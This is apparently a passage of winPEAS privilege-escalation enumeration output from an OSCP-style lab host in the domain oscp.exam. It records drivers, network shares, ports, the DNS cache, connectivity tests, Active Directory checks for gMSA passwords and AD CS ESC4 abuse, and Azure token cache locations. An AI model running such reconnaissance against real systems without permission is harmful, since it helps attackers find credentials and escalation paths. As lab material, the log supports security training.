    SmartRAID, SmartHBA PQI Storport Driver - 1.50.1.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys
    VMware Guest Introspection Driver - 12.1.0.0 build-19947491 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsepflt.sys
    VMware Raw Disk Helper Driver - 1.1.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmrawdsk.sys
    VMware Guest Introspection WFP Network Filter Driver - 12.1.0.0 build-19947491 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vnetWFP.sys
    VMware Pointing PS/2 Device Driver - 12.5.12.0 build-18967789 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
    VMware SVGA 3D - 9.17.04.0001 - build-20112898 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
    VMware SVGA 3D - 9.17.04.0001 - build-20112898 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
    VMware server memory controller - 7.5.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys
    VMware PCIe Ethernet Adapter NDIS 6.85 (64-bit) - 1.9.19.0 build-24153797 [Broadcom Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmxnet3.sys
    Intel(R) Gigabit Adapter - 12.19.1.32 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\e1i68x64.sys


════════════════════════════════════╣ Network Information ╠════════════════════════════════════

╔══════════╣ Network Shares
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )

╔══════════╣ Enumerate Network Mapped Drives (WMI)
   Local Name         :       
   Remote Name        :       \\192.168.49.104\share
   Remote Path        :       \\192.168.49.104\share
   Status             :       OK
   Connection State   :       Connected
   Persistent         :       False
   UserName           :       username
   Description        :       RESOURCE CONNECTED - Microsoft Windows Network

   =================================================================================================


╔══════════╣ Host File

╔══════════╣ Network Ifaces and known hosts
╚ The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:8A:96:F7]: 192.168.104.206 / 255.255.255.0
        Gateways: 192.168.104.254
        Known hosts:
          192.168.104.111       00-50-56-8A-67-09     Dynamic
          192.168.104.254       00-50-56-8A-C5-9B     Dynamic
          192.168.104.255       FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static

    Ethernet1[00:50:56:8A:38:82]: 172.16.104.206 / 255.255.255.0
        DNSs: 172.16.104.200
        Known hosts:
          172.16.104.200        00-50-56-8A-16-6F     Dynamic
          172.16.104.255        FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          224.0.0.252           00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static


╔══════════╣ Current TCP Listening Ports
╚ Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               135           0.0.0.0               0               Listening         1004            svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         1060            svchost
  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         5560            svchost
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         748             lsass
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         608             wininit
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1448            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         2032            svchost
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         2276            svchost
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         748             lsass
  TCP        0.0.0.0               49670         0.0.0.0               0               Listening         716             services
  TCP        172.16.104.206        139           0.0.0.0               0               Listening         4               System
  TCP        192.168.104.206       139           0.0.0.0               0               Listening         4               System
  TCP        192.168.104.206       3389          192.168.49.104        56942           Established       1060            svchost
  TCP        192.168.104.206       57880         192.168.49.104        445             Established       4               System

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        135           [::]                                        0               Listening         1004            svchost
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        3389          [::]                                        0               Listening         1060            svchost
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         748             lsass
  TCP        [::]                                        49665         [::]                                        0               Listening         608             wininit
  TCP        [::]                                        49666         [::]                                        0               Listening         1448            svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         2032            svchost
  TCP        [::]                                        49668         [::]                                        0               Listening         2276            svchost
  TCP        [::]                                        49669         [::]                                        0               Listening         748             lsass
  TCP        [::]                                        49670         [::]                                        0               Listening         716             services

╔══════════╣ Current UDP Listening Ports
╚ Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            1324              svchost
  UDP        0.0.0.0               500           *:*                            3100              svchost
  UDP        0.0.0.0               3389          *:*                            1060              svchost
  UDP        0.0.0.0               4500          *:*                            3100              svchost
  UDP        0.0.0.0               5050          *:*                            5560              svchost
  UDP        0.0.0.0               5353          *:*                            1816              svchost
  UDP        0.0.0.0               5355          *:*                            1816              svchost
  UDP        0.0.0.0               54393         *:*                            1816              svchost
  UDP        0.0.0.0               63044         *:*                            1816              svchost
  UDP        127.0.0.1             1900          *:*                            3204              svchost
  UDP        127.0.0.1             51548         *:*                            3204              svchost
  UDP        127.0.0.1             51710         *:*                            4352              C:\Windows\system32\svchost.exe
  UDP        127.0.0.1             53217         *:*                            4848              C:\Users\r.andrews\winPEASx64.exe
  UDP        127.0.0.1             56491         *:*                            748               lsass
  UDP        127.0.0.1             61144         *:*                            1600              svchost
  UDP        127.0.0.1             62196         *:*                            2940              svchost
  UDP        172.16.104.206        137           *:*                            4                 System
  UDP        172.16.104.206        138           *:*                            4                 System
  UDP        172.16.104.206        1900          *:*                            3204              svchost
  UDP        172.16.104.206        51547         *:*                            3204              svchost
  UDP        192.168.104.206       137           *:*                            4                 System
  UDP        192.168.104.206       138           *:*                            4                 System
  UDP        192.168.104.206       1900          *:*                            3204              svchost
  UDP        192.168.104.206       51546         *:*                            3204              svchost

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            1324              svchost
  UDP        [::]                                        500           *:*                            3100              svchost
  UDP        [::]                                        3389          *:*                            1060              svchost
  UDP        [::]                                        4500          *:*                            3100              svchost
  UDP        [::]                                        62055         *:*                            1816              svchost
  UDP        [::]                                        63044         *:*                            1816              svchost
  UDP        [::1]                                       1900          *:*                            3204              svchost
  UDP        [::1]                                       51545         *:*                            3204              svchost

╔══════════╣ Firewall Rules
╚ Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: DOMAIN, PUBLIC
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    True
    FirewallEnabled (Public):    True
    DENY rules:
  [X] Exception: Object reference not set to an instance of an object.

╔══════════╣ DNS cached --limit 70--
    Entry                                 Name                                  Data
    _ldap._tcp.pdc._msdcs.oscp.exam       _ldap._tcp.pdc._msdcs.oscp.exam       dc20.oscp.exam 0 100 389
    _ldap._tcp.pdc._msdcs.oscp.exam       dc20.oscp.exam                        172.16.104.200
    dc20.oscp.exam                        DC20.oscp.exam                        172.16.104.200
    dc20.oscp.exam                        DC20.oscp.exam                        172.16.104.200
    ...-name._sites.gc._msdcs.oscp.exam   ...-Name._sites.gc._msdcs.oscp.exam   dc20.oscp.exam 0 100 3268
    ...-name._sites.gc._msdcs.oscp.exam   dc20.oscp.exam                        172.16.104.200
    ...._sites.forestdnszones.oscp.exam   ...._sites.ForestDnsZones.oscp.exam   dc20.oscp.exam 0 100 389
    ...._sites.forestdnszones.oscp.exam   dc20.oscp.exam                        172.16.104.200
    displaycatalog.mp.microsoft.com                                             
    ...._sites.domaindnszones.oscp.exam   ...._sites.DomainDnsZones.oscp.exam   dc20.oscp.exam 0 100 389
    ...._sites.domaindnszones.oscp.exam   dc20.oscp.exam                        172.16.104.200

╔══════════╣ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        CertificateRevocation                     1
  HKCU        DisableCachingOfSSLPages                  0
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           10240
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKCU        WarnonZoneCrossing                        0
  HKCU        EnableNegotiate                           1
  HKCU        ProxyEnable                               0
  HKCU        MigrateProxy                              1
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        MinorVersion                              0
  HKLM        WarnOnIntranet                            1

  Zone Maps
  No URLs configured

  Zone Auth Settings
  No Zone Auth Settings

╔══════════╣ Internet Connectivity
╚ Checking if internet access is possible via different methods 
    HTTP (80) Access: Not Accessible
  [X] Exception:       Error: A task was canceled.
    HTTPS (443) Access: Not Accessible
  [X] Exception:       Error: TCP connect timed out
    HTTPS (443) Access by Domain Name: Not Accessible
  [X] Exception:       Error: A task was canceled.
    DNS (53) Access: Not Accessible
  [X] Exception:       Error: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond
    ICMP (ping) Access: Not Accessible
  [X] Exception:       Error: Ping failed: TimedOut

╔══════════╣ Hostname Resolution
╚ Checking if the hostname can be resolved externally 
  [X] Exception:     Error during hostname check: An error occurred while sending the request.


════════════════════════════════════╣ Active Directory Quick Checks ╠════════════════════════════════════

╔══════════╣ gMSA readable managed passwords
╚ Look for Group Managed Service Accounts you can read (msDS-ManagedPassword) https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/gmsa.html
  [-] No gMSA with readable managed password found (checked 0).

╔══════════╣ AD CS misconfigurations for ESC
╚  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html
╚ Check for ADCS misconfigurations in the local DC registry
  [-] Host is not a domain controller. Skipping ADCS Registry check
╚ 
If you can modify a template (WriteDacl/WriteOwner/GenericAll), you can abuse ESC4
  [-] No templates with dangerous rights found (checked 0).


════════════════════════════════════╣ Cloud Information ╠════════════════════════════════════
Learn and practice cloud hacking in training.hacktricks.xyz
AWS EC2?                                No   
Azure VM?                               No   
Azure Tokens?                           Yes  
Google Cloud Platform?                  No   
Google Workspace Joined?                No   
Google Cloud Directory Sync?            No   
Google Password Sync?                   No   

╔══════════╣ Azure Tokens Enumeration
  [X] Exception: The directory 'C:\Users\r.andrews\AppData\Local\Microsoft\IdentityCache' does not exist.
  [X] Exception: An error occurred while scanning the identityCache directory: Could not find a part of the path 'C:\Users\r.andrews\AppData\Local\Microsoft\IdentityCache'.
Local Info
C:\Users\r.andrews\AppData\Local\Microsoft\TokenBroker\Cache\2018c83c16e29d57e69047a488b1267e21c9c9bf.tbres

```